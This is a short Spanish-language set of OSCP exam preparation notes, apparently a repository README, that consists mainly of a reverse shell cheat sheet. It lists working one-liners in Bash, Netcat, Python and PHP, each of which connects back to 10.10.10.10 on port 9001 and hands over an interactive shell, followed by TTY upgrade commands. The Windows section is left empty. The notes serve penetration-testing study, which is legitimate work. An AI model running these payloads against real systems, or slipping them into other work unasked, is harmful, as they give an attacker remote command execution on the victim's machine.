﻿# Notas de preparación para el OSCP 

**Año : 2021**

![oscp](https://blog.nivel4.com/wp-content/uploads/2019/01/try-harder.png)

**Curso: Penetration Testing with Kali Linux (PEN-200)**

## Contenido
- [Linux](#Linux)  
  - [Reverse shells](#Reverse-shells) 
    - [Bash](#Bash)
    - [Netcat](#Netcat)   
    - [Python](#Python)
  - [Mejorando nuestra shell](#Spawning-a-TTY-shell)   
  - [Files]  
  - Bypassing restricted shells (rbash , rzsh,etc)    
- [Windows](#Windows)
- 
- [Reverse Shell]

Linux 
=========================================
Técnicas para utilizar en sistemas basados en unix

### Reverse shells

[Reverse shell generator](https://www.revshells.com/)

### Reverse shell comúnes
#### Bash
  ```bash
  bash -i >& /dev/tcp/10.10.10.10/9001 0>&1 
  ```
#### Netcat 
  ```bash
  nc -e /bin/bash 10.10.10.10 9001
  nc -e /bin/sh 10.10.10.10 9001
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
  ```
  
#### Python
  ```bash
  export RHOST="10.10.10.10";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
  
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
  ```
#### PHP 
  ```bash
  php -r '$sock=fsockopen("10.10.10.10",9001);exec("bash <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.10.10.10",9001);shell_exec("bash <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.10.10.10",9001);system("bash <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.10.10.10",9001);passthru("bash <&3 >&3 2>&3");'
  /usr/share/webshells/laudanum/php/php-reverse-shell.php
  ```
  





  ```bash 
      python3 -c 'import pty;pty.spawn("/bin/bash")' 
      script /dev/null -c bash
  ```
     
  
3. Windows
